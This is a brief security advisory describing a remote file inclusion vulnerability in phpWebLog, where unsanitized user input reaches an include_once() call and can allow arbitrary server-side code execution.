phpWebLog is prone to remote file include vulnerability. This issue is due to a failure of the application to properly sanitize user-supplied input prior to using it in a PHP 'include_once()' function call.

An attacker may leverage this issue to execute arbitrary server-side script code on an affected computer with the privileges of the Web server process. This may facilitate unauthorized access.
